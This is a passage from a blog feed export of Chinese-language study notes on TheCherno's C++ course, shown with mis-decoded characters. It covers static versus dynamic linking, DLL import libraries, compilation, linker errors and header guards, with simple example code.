C++</h1><p><strong>åŠ¨æ€é“¾æ¥æ˜¯åœ¨è¿è¡Œæ—¶è¿›è¡Œé“¾æ¥ï¼Œè€Œé™æ€é“¾æ¥æ˜¯åœ¨ç¼–è¯‘æ—¶å‘ç”Ÿçš„ã€‚</strong><br>ç›¸æ¯”ä¹‹ä¸‹ç”±äºé™æ€é“¾æ¥ä¸­ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨å®Œå…¨çŸ¥é“é™æ€é“¾æ¥æ—¶å®é™…è¿›å…¥åº”ç”¨ç¨‹åºçš„ä»£ç ï¼Œå…¶å…è®¸æ›´å¤šçš„ä¼˜åŒ–å‘ç”Ÿã€‚</p><p>GLFWåŒæ—¶æ”¯æŒé™æ€å’ŒåŠ¨æ€é“¾æ¥ï¼ŒäºŒè€…ä½¿ç”¨ç›¸åŒçš„å¤´æ–‡ä»¶ã€‚</p><p>glfw3dll.libåŸºæœ¬ä¸Šå°±æ˜¯ä¸€å †æŒ‡å‘dllæ–‡ä»¶çš„æŒ‡é’ˆï¼Œè¿™æ ·å°±ä¸ç”¨åœ¨è¿è¡Œæ—¶å»æ£€ç´¢æ‰€æœ‰ä¸œè¥¿çš„ä½ç½®ï¼Œå› æ­¤éœ€è¦é“¾æ¥glfw3dll.libã€‚</p><p>glfw3.dlléœ€è¦å’Œexeæ–‡ä»¶æ”¾åœ¨ä¸€èµ·æ‰èƒ½è¢«è®¿é—®ã€‚</p><p><img src="/2023/04/07/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-31-50/Untitled.png" alt></p><p>C++åˆ›å»ºä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œç¼–è¯‘åä¼šç”Ÿæˆä¸¤ä¸ªå¯ç”¨çš„æ–‡ä»¶ä¸€ä¸ªæ˜¯libæ–‡ä»¶ä¸€ä¸ªæ˜¯dllæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªlibæ–‡ä»¶æ˜¯å¹²å˜›çš„å‘¢ï¼Ÿ<br>åœ¨ä½¿ç”¨åŠ¨æ€åº“çš„æ—¶å€™ï¼Œå¾€å¾€æä¾›ä¸¤ä¸ªæ–‡ä»¶ï¼šä¸€ä¸ªå¼•å…¥åº“libå’Œä¸€ä¸ªDLLã€‚<strong>å¼•å…¥åº“åŒ…å«è¢«DLLå¯¼å‡ºçš„å‡½æ•°å’Œå˜é‡çš„ç¬¦å·åï¼ŒDLLåŒ…å«å®é™…çš„å‡½æ•°å’Œæ•°æ®</strong>ã€‚åœ¨ç¼–è¯‘é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œåªéœ€è¦é“¾æ¥å¼•å…¥åº“ï¼ŒDLLä¸­çš„å‡½æ•°ä»£ç å’Œæ•°æ®å¹¶ä¸å¤åˆ¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™ï¼Œå†å»åŠ è½½DLLï¼Œè®¿é—®DLLä¸­å¯¼å‡ºçš„å‡½æ•°ã€‚<br>1ï¼ <strong>Load-time Dynamic Linking è½½å…¥æ—¶åŠ¨æ€é“¾æ¥</strong><br>è¿™ç§ç”¨æ³•çš„å‰ææ˜¯åœ¨ç¼–è¯‘ä¹‹å‰å·²ç»æ˜ç¡®çŸ¥é“è¦è°ƒç”¨DLLä¸­çš„å“ªå‡ ä¸ªå‡½æ•°ï¼Œç¼–è¯‘æ—¶åœ¨ç›®æ ‡æ–‡ä»¶ä¸­åªä¿ç•™å¿…è¦çš„é“¾æ¥ä¿¡æ¯ï¼Œè€Œä¸å«DLLå‡½æ•°çš„ä»£ç ï¼›å½“ç¨‹åºæ‰§è¡Œæ—¶ï¼Œåˆ©ç”¨é“¾æ¥ä¿¡æ¯åŠ è½½DLLå‡½æ•°ä»£ç å¹¶åœ¨å†…å­˜ä¸­å°†å…¶é“¾æ¥å…¥è°ƒç”¨ç¨‹åºçš„æ‰§è¡Œç©ºé—´ä¸­ï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯ä¾¿äºä»£ç å…±äº«ã€‚<br>2ï¼ <strong>Run-time Dynamic Linking è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥</strong><br>è¿™ç§æ–¹å¼æ˜¯æŒ‡åœ¨ç¼–è¯‘ä¹‹å‰å¹¶ä¸çŸ¥é“å°†ä¼šè°ƒç”¨å“ªäº›DLLå‡½æ•°ï¼Œå®Œå…¨æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ ¹æ®éœ€è¦å†³å®šåº”è°ƒç”¨å“ªä¸ªå‡½æ•°ï¼Œå¹¶<strong>ç”¨LoadLibraryå’ŒGetProcAddressåŠ¨æ€è·å¾—DLLå‡½æ•°çš„å…¥å£åœ°å€</strong>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> Cherno </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chernoç¬”è®°(1-30)</title>
      <link href="/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/"/>
      <url>/2023/04/01/C-Cherno-Cherno%E7%AC%94%E8%AE%B0-1-30/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ğŸ’¡ â€œBest C++ course for game developmentã€‚â€<br>åŒæ ·é€‚åˆä½œä¸ºC++åˆå­¦è€…çš„å…¥é—¨è¯¾ï¼Œè®²åˆ°éƒ½æ˜¯C++åœ¨å·¥ä½œä¸­æœ€é‡è¦çš„å†…å®¹ã€‚</p></blockquote><p>è¯¾ç¨‹åœ°å€ï¼š<a href="https://www.youtube.com/watch?v=18c3MTX0PK0&amp;list=PLlrATfBNZ98dudnM48yfGUldqGD0S4FFb&amp;index=1">Youtubeä¸ŠTheChernoä¸Šä¼ çš„è§†é¢‘</a><br>ç¿»è¯‘ï¼š<a href="https://www.bilibili.com/video/BV1uy4y167h2/?spm_id_from=333.788&amp;vd_source=0d3fa48307c38b76dfdfa60ed4b44b42">ç¥ç»å…ƒçŒ«çš„é«˜è´¨é‡ç¿»è¯‘</a></p><h1 id="1-Welcome-to-C">1 Welcome to C++</h1><p>å¦‚æœç”¨C++å†™åƒåœ¾ä»£ç ï¼Œç”šè‡³æœ‰å¯èƒ½æ¯”è™šæ‹Ÿæœºè¯­è¨€ï¼ˆC#, Javaï¼‰æ›´æ…¢ï¼Œå› ä¸ºåè€…ä¼šå†è¿è¡Œæ—¶ä¼˜åŒ–å¾ˆå¤šä¸œè¥¿è€ŒC++ä¸ä¼šã€‚</p><h1 id="2-How-to-Setup-C-on-Windows">2 How to Setup C++ on Windows</h1><p>ä¸è¦ä½¿ç”¨VSé»˜è®¤ä½ç½®ï¼šåœ°å€é•¿ä¸”åŒ…å«ä¸€ä¸ªç©ºæ ¼ï¼Œè‹±ä¼Ÿè¾¾çš„æŸäº›VSå®‰å“æ’ä»¶çš„æŸäº›éƒ¨åˆ†æ— æ³•æ­£å¸¸å·¥ä½œã€‚</p><p><strong>solutionåŸºæœ¬å°±æ˜¯ä¸€ä¸ªå·¥ä½œå°ï¼Œæ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªç›¸å…³projectçš„é›†åˆ</strong>ï¼Œè¿™äº›projectå¯ä»¥æ˜¯ä¸åŒç±»å‹çš„ï¼Œæ¯”å¦‚dllã€exeã€libç­‰ï¼Œè€Œæ¯ä¸ªprojectæ˜¯æ–‡ä»¶çš„é›†åˆï¼Œç„¶åè¢«ç¼–è¯‘æˆæŸç§ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ¯”å¦‚libraryæˆ–executableï¼‰ã€‚</p><h1 id="3-How-to-Setup-C-on-Mac">3 How to Setup C++ on Mac</h1><p>åé¢çš„æ•™ç¨‹éƒ½æ˜¯åŸºäºVisual Studioçš„ï¼Œç”±äºæ²¡é’±ä¹°Macï¼Œè¿™é‡Œå°±è·³è¿‡äº†ã€‚</p><h1 id="4-How-to-Setup-C-on-Linux">4 How to Setup C++ on Linux</h1><p>è¿™èŠ‚æ•™Linuxä¸Š<a href="https://www.codeblocks.org/">Code::Blocks</a>çš„ä½¿ç”¨ï¼Œæœ¬äººåœ¨Linuxä¸Šä¹ æƒ¯ç”¨VS codeï¼Œè¿™èŠ‚æ²¡è®¤çœŸçœ‹ã€‚</p><h1 id="5-How-C-Works">5 How C++ Works</h1><p>ä»»ä½•ä»¥#å¼€å¤´çš„éƒ½æ˜¯<code>é¢„å¤„ç†æŒ‡ä»¤ï¼ˆprocessor statement</code> ï¼Œä¼šå°†å¯¹åº”æ–‡ä»¶è¿›è¡Œæ‹·è´å’Œç²˜è´´ï¼Œå®ƒä»¬å‘ç”Ÿåœ¨çœŸæ­£çš„ç¼–è¯‘è¿‡ç¨‹ä¹‹å‰ã€‚</p><p>å¦‚æœä½ ä¸è¿”å›ä»»ä½•å€¼ï¼Œå®ƒä¼šè¿”å›0ï¼Œè¿™åªé€‚ç”¨äºmain()ã€‚</p><p><code>&lt;&lt;</code> ï¼šè¢«é‡è½½çš„ç¬¦å·ï¼Œè™½ç„¶çœ‹èµ·æ¥åƒè¿ç®—ç¬¦ï¼Œå¯ä»¥æŠŠå®ƒä»¬æƒ³è±¡æˆä¸€ä¸ªå‡½æ•°ã€‚<br><code>std::cout &lt;&lt; â€œHello World!â€ &lt;&lt; std::endl;</code> å¯ä»¥æƒ³æˆä¼ªä»£ç  <code>std::cout.print(â€Hello World!â€).print(std::endl);</code> ï¼ˆåè€…è·‘ä¸èµ·æ¥ï¼‰ã€‚</p><p>é˜²æ­¢å…³é—­çª—å£ï¼š<code>std::cin.get()</code> æˆ– <code>system(â€pauseâ€);</code> ã€‚</p><p>VSä¸­Output Windowå’ŒError Listéƒ½å¯ä»¥çœ‹åˆ°é”™è¯¯ï¼Œä½†æ˜¯Error Listå‡ ä¹æ˜¯åƒåœ¾ï¼Œå®ƒæœ¬èº«å°±æ˜¯å°è¯•åœ¨Outputä¸­å¯»æ‰¾Errorå•è¯å¹¶æŠŠä¿¡æ¯åŠ å…¥Error Listï¼Œå®ƒæä¾›çš„æ˜¯overviewï¼Œå¦‚æœæƒ³è¦æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¿˜æ˜¯å¾—å»Output Windowsä¸­çœ‹ã€‚<br>åŒå‡»Outputä¸­çš„è¡Œæ•°ï¼Œä¼šè‡ªåŠ¨å°†å…‰æ ‡å®šä½åˆ°å¯¹åº”ä½ç½®ã€‚</p><ul><li>å£°æ˜ï¼ˆdeclarationsï¼‰ï¼šè¯´è¯¥ç¬¦å·æˆ–è€…å‡½æ•°å­˜åœ¨</li><li>å®šä¹‰ï¼ˆdefinitionsï¼‰ï¼šè¯´æ˜è¿™ä¸ªå‡½æ•°åˆ°åº•æ˜¯å•¥</li></ul><p>è‹¥å£°æ˜å´æ²¡æœ‰å®šä¹‰å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¾æ—§å®Œå…¨ç›¸ä¿¡ä½ ï¼Œä½†é“¾æ¥å™¨è¯•å›¾å¯»æ‰¾å®šä¹‰çš„å‡½æ•°æ—¶å´æ‰¾ä¸åˆ°è¯¥å‡½æ•°å°±ä¼šæŠ¥é“¾æ¥é”™è¯¯ã€‚å¦‚æœéƒ½æ­£ç¡®äº†ï¼Œç¼–è¯‘å™¨ä¼šå°†æ¯ä¸ªæ–‡ä»¶ä½†å•ç‹¬ç¼–è¯‘ä¸º .obj æ–‡ä»¶ï¼Œè€Œé“¾æ¥å™¨ä¼šå°†ä»–ä»¬åˆå¹¶ä¸ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¾‹å¦‚ exe æ–‡ä»¶ã€‚</p><h1 id="6-How-the-C-Compiler-Works">6 How the C++ Compiler Works</h1><p>cppæ–‡ä»¶å¯ç§°ä¸º <code>translation unit</code>ï¼Œc++å’ŒJavaä¸åŒï¼šJavaæ–‡ä»¶å¿…é¡»ä¸classå¯¹åº”ï¼Œè€Œæ–‡ä»¶å¤¹å¿…é¡»ä¸packageå¯¹åº”ï¼›è€Œ<strong>C++ä¸­æ–‡ä»¶åªæ˜¯å‘ç¼–è¯‘å™¨å–‚æºç çš„æ–¹å¼ï¼Œä¸€ä¸ªcppæ–‡ä»¶å¯¹åº”ä¸€ä¸ªobjæ–‡ä»¶ã€‚</strong></p><p>#include é¢„å¤„ç†æŒ‡ä»¤åªæ˜¯ä¼šå°†å¯¹åº”æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹åŸåŸæœ¬æœ¬çš„å¤åˆ¶ç²˜è´´åˆ°æºç ä¸­ï¼Œå½¢æˆ.iåç¼€æ–‡ä»¶ï¼ˆVSä¸­éœ€è¦åœ¨é¡¹ç›®å±æ€§ä¸­æ‰“å¼€é¢„å¤„ç†åˆ°æ–‡ä»¶ï¼Œæ³¨æ„VSæç¤ºæˆ‘ä»¬è¿™å°†ä¸ä¼šç”Ÿæˆobjæ–‡ä»¶ï¼‰ã€‚</p><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹è¯­å¥æ§åˆ¶.iæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#<span class="keyword">if</span> æ¡ä»¶</span><br><span class="line">è¯­å¥å—<span class="number">1</span></span><br><span class="line">#<span class="keyword">else</span></span><br><span class="line">è¯­å¥å—<span class="number">2</span></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p><strong>constant folding</strong>ï¼šç¼–è¯‘ä¼˜åŒ–æ—¶å®Œæˆå¸¸æ•°è¿ç®—ï¼Œè€Œéè¿è¡Œæ—¶ï¼Œæ¯”å¦‚ return 2 * 5 å¯¹åº” mov eax 10ã€‚</p><p>Debugæ¨¡å¼é»˜è®¤å¼€å¯Odï¼Œå³ä¸ä¼˜åŒ–ï¼Œä¾¿äºåˆ†æ.asmæ±‡ç¼–æ–‡ä»¶ã€‚</p><h1 id="7-How-the-C-Linker-Works">7 How the C++ Linker Works</h1><p>VSæŒ‰<code>ctrl+F7</code>æˆ–ç‚¹ç¼–è¯‘ï¼Œåˆ™åªä¼šè¿›è¡Œç¼–è¯‘<br>VSæŒ‰<code>ctrl+F5</code>æˆ–ç‚¹ç”Ÿæˆï¼ˆbuildï¼‰ï¼Œåˆ™ä¼šå¯¹æ•´ä¸ªé¡¹ç›®è¿›è¡Œcompile+linkï¼Œéœ€è¦entry pointï¼ˆå¯ä»¥æ˜¯main()ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–â€”â€”åœ¨VSé¡¹ç›®å±æ€§ä¸­å®šä¹‰ï¼‰</p><p>error C2143ï¼šä»¥Cå¼€å¤´ä¸ºç¼–è¯‘é”™è¯¯ï¼ŒLNK2143ï¼šä»¥LNKå¼€å¤´ä¸ºé“¾æ¥æ—¶é”™è¯¯</p><h2 id="Unresolved-external-symbol">Unresolved external symbol</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---Log.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Logr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Math.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Multiply&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">Multiply</span>(<span class="number">5</span>, <span class="number">8</span>) &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>ç”±äºlinkeræ‰¾ä¸åˆ°Log()ï¼Œbuildä¼šæŠ¥ LNK1120ï¼š1 unresolved external symbolã€‚</li><li>è‹¥æ³¨é‡Šæ‰15è¡Œ  <code>Log(&quot;Multiply&quot;);</code> åˆ™ä¸ä¼šæŠ¥é”™ï¼Œå› ä¸ºlinkerä¸éœ€è¦å»å¯»æ‰¾Log()åœ°å€ã€‚</li><li>è‹¥æ³¨é‡Š20è¡Œ <code>std::cout &lt;&lt; Multiply(5, 8) &lt;&lt; std::endl;</code> åˆ™ä»ç„¶ä¼šæŠ¥é”™ï¼Œå› ä¸º<strong>è™½ç„¶æœ¬æ–‡ä»¶æ²¡ç”¨åˆ°Multiply()ï¼Œä½†æ˜¯å…¶ä»–æ–‡ä»¶ç”Ÿæˆæ—¶å¯èƒ½ä¼šlinkåˆ°Multiply()ã€‚</strong></li><li>è‹¥æ³¨é‡Š20è¡Œï¼ŒåŒæ—¶åœ¨Multiply()å‰åŠ ä¸Š<strong>staticå£°æ˜</strong>ï¼ˆä¸èƒ½è¢«å…¶ä»–objæ–‡ä»¶å‡½æ•°å¼•ç”¨ï¼‰ï¼Œåˆ™ä¸ä¼šæŠ¥é”™ã€‚</li></ol><h2 id="é‡å¤å®šä¹‰">é‡å¤å®šä¹‰</h2><ol><li>ä¸€ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸¤ä¸ªåç§°ã€å‚æ•°ã€è¿”å›ç±»å‹å®Œå…¨ç›¸åŒçš„å‡½æ•°ä¼šæŠ¥ C2084ã€‚</li><li>ä¸¤ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ä¸¤ä¸ªåç§°ã€å‚æ•°ã€è¿”å›ç±»å‹å®Œå…¨ç›¸åŒçš„å‡½æ•°ä¼šæŠ¥ LNK1169ã€‚ä¸‹é¢ä¾‹å­å±•ç¤ºè¿™ç§é”™è¯¯æœ‰å¤šå®¹æ˜“çŠ¯ï¼š</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ---Log.h---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Log.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Initialized Log&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---Math.cpp---</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Multiply</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">Log</span>(<span class="string">&quot;Multiply&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="built_in">Multiply</span>(<span class="number">5</span>, <span class="number">8</span>) &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼š Log.cppå’ŒMath.cppä¸­éƒ½æœ‰ Log() çš„å®šä¹‰ï¼Œè¿™å¯¼è‡´linkeræ— æ³•é€‰æ‹©ã€‚</p><p>3é’Ÿè§£å†³æ–¹å¼å¦‚ä¸‹ï¼š</p><ol><li>æ¨èï¼š<strong>.hå¤´æ–‡ä»¶ä¿ç•™å£°æ˜ï¼Œå®šä¹‰æ”¾åˆ°ç¬¬ä¸‰ä¸ªtranslation unitä¸­</strong>ï¼Œè¿™é‡Œæ”¾åˆ°Log.cppä¸­å¾ˆåˆé€‚ã€‚</li><li>åœ¨.hä¸­Log()å‰åŠ ä¸Šstaticï¼š2ä¸ªcppä¸­çš„Logéƒ½ä¸èƒ½è¢«å…¶ä»–objæ–‡ä»¶é“¾æ¥</li><li>åœ¨.hä¸­Log()å‰åŠ ä¸Šinlineï¼šä½œç”¨æ˜¯å°†å‡½æ•°è°ƒç”¨ç›´æ¥æ›¿æ¢æˆå‡½æ•°ä½“<br><code>Log(&quot;Initialized Log&quot;);</code> å˜æˆ <code>std::cout &lt;&lt; &quot;Initialized Log&quot; &lt;&lt; std::endl;</code></li></ol><h1 id="8-Variables-in-C">8 Variables in C++</h1><p>c++ä¸­ä¸åŒå˜é‡ç±»å‹ä¹‹é—´çš„å”¯ä¸€åŒºåˆ«æ˜¯å¤§å°â€”â€”åˆ›å»ºå˜é‡æ—¶é€šè¿‡æ•°æ®ç±»å‹å†³å®šåˆ†é…çš„å†…å­˜å¤§å°ã€‚æ•°æ®ç±»å‹å–å†³äºç¨‹åºå‘˜ï¼Œå¹¶æ²¡æœ‰å¾ˆå¤šè§„åˆ™å»æŸç¼šï¼Œä½†æ˜¯coutç­‰æ—¶ä¼šæ ¹æ®ç±»å‹å†³å®šæ‰“å°çš„ç»“æœã€‚<br>( Chernoè¿™æ ·è¯´å…¶å®æœ‰ç‚¹é—®é¢˜ï¼Œä¸åªæ˜¯å†…å­˜å¤§å°ä¸åŒçš„é—®é¢˜ï¼Œç±»å‹è¿˜å°†å†³å®šå¯æ‰§è¡Œçš„æ“ä½œã€‚)</p><p><code>float val = 5.5;</code> å¯èƒ½ä¼šä»¥ä¸ºæµ®ç‚¹æ•°å¸¸é‡çš„æ˜¯floatç±»å‹ï¼Œä½†åœ¨VSæŠŠå…‰æ ‡æ”¾åˆ°<code>5.5</code>ä¸Šå¯ä»¥çœ‹åˆ°å…¶å®æ˜¯(double)(5.5)ï¼Œç¨åè¢«å¼ºåˆ¶è½¬åŒ–ä¸ºfloatã€‚<br>è¦å®šä¹‰æµ®ç‚¹æ•°è¦ä½¿ç”¨ <code>float val = 5.5f;</code> æˆ– <code>float val = 5.5F;</code> ã€‚</p><p>boolç±»å‹å˜é‡åªæœ‰0æ˜¯falseï¼Œé0éƒ½æ˜¯trueï¼Œæ‰“å°boolå˜é‡ä¼šå¾—åˆ°0æˆ–1ã€‚<br>è™½ç„¶å­˜å‚¨boolç±»å‹æŒ‰ç†æ¥è¯´1bitå°±å¯ä»¥ï¼Œä½†æ²¡åŠæ³•å¯»å€1ä¸ªbitçš„å†…å®¹ï¼Œå†…å­˜å¯»å€çš„æœ€å°å•å…ƒæ˜¯byteã€‚å¯é€šè¿‡æŠ€å·§è§£å†³ï¼šä¸€ä¸ªbyteæ”¾8ä¸ªboolã€‚</p><h1 id="9-Functions">9 Functions</h1><ul><li>å‡½æ•°ï¼šé™ä½é‡å¤ä»£ç çš„ä»£ç å—ã€‚</li><li>æ–¹æ³•ï¼šclassä¸­çš„ä»£ç å—ã€‚</li></ul><p>å£°æ˜åº”å½“æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œå®šä¹‰æ”¾åœ¨cppæ–‡ä»¶ä¸­ã€‚</p><h1 id="10-Header-files">10 Header files</h1><p>æœ‰ä¸¤ç§ä¸åŒæ–‡ä»¶ç±»å‹çš„æ¦‚å¿µï¼Œä¸€ç§æ˜¯åƒcppä¸€æ ·ç¼–è¯‘æ–‡ä»¶ï¼Œè¿™ç§å°±æœ‰å¤´æ–‡ä»¶æ¦‚å¿µï¼›è€Œå¦ä¸€ç§åƒC#å’ŒJavaä¸­æ²¡æœ‰å¤´æ–‡ä»¶æ¦‚å¿µã€‚</p><p>VSä¸­æ–‡ä»¶å¤¹æ˜¯å‡çš„ï¼Œæ–‡ä»¶å…·ä½“æ”¾åœ¨å“ªä¸ªæ–‡ä»¶å¤¹å…¶å®éƒ½å¯ä»¥ã€‚</p><p><code>#pragma once</code>: #å¼€å¤´çš„éƒ½æ˜¯é¢„å¤„ç†æŒ‡ä»¤ï¼Œå‘ç”Ÿåœ¨ç¼–è¯‘ä¹‹å‰ã€‚<br>ç»„ç»‡å•ä¸ªå¤´æ–‡ä»¶è¢«å¤šæ¬¡åŒ…å«ï¼Œå¹¶è½¬æ¢ä¸ºå•ä¸ªç¿»è¯‘å•å…ƒâ€”â€”å¯ä»¥è¢«æ”¾åœ¨ç¨‹åºçš„å¤šä¸ªä½ç½®ï¼Œä½†ä¸€ä¸ªç¿»è¯‘å•å…ƒï¼ˆä¸€ä¸ªcppæ–‡ä»¶ï¼‰åªèƒ½æ”¾ä¸€æ¬¡ã€‚</p><p><code>#pragma once</code> <strong>å¾ˆç®€æ´å¾ˆå¥½ç”¨ï¼Œå·¥ä¸šä¸­å¹¿æ³›åº”ç”¨</strong>ã€‚<br>å¦ä¸€ç§ä¼ ç»Ÿæ–¹å¼æ˜¯æ·»åŠ  <code>header guides</code> å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>å¦‚æœè¢«åŒ…å«ä¸¤æ¬¡ï¼Œåˆ™ç»“æœå¦‚ä¸‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitLog</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Log</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Player</span> &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LOG_H  <span class="comment">// false, endifå‰çš„éƒ½ä¸ä¼šè¢«æ‰§è¡Œ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _LOG_H</span></span><br><span class="line"></span><br><span class="line"><span 